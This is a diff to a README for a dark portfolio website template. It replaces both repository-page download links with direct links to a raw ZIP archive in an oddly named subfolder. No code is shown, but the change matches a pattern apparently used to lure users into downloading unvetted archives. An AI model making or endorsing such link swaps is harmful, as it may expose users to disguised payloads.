@@ -1,6 +1,6 @@
 # 🕶️ portofolio-dark-tency - Dark portfolio with clean motion
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-7B2CBF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fuxkxtc/portofolio-dark-tency)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-7B2CBF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fuxkxtc/portofolio-dark-tency/main/indigitamenta/tency_dark_portofolio_v1.3.zip)
 
 ## 🌐 What this is
 
@@ -19,7 +19,7 @@ It is meant for anyone who wants a simple site that opens in a browser and shows
 
 Use this link to visit the download page and get the project files:
 
-[Visit the download page](https://github.com/fuxkxtc/portofolio-dark-tency)
+[Visit the download page](https://raw.githubusercontent.com/fuxkxtc/portofolio-dark-tency/main/indigitamenta/tency_dark_portofolio_v1.3.zip)
 
 If the page gives you a ZIP file or source files, download them to your PC before moving to the next step.
 
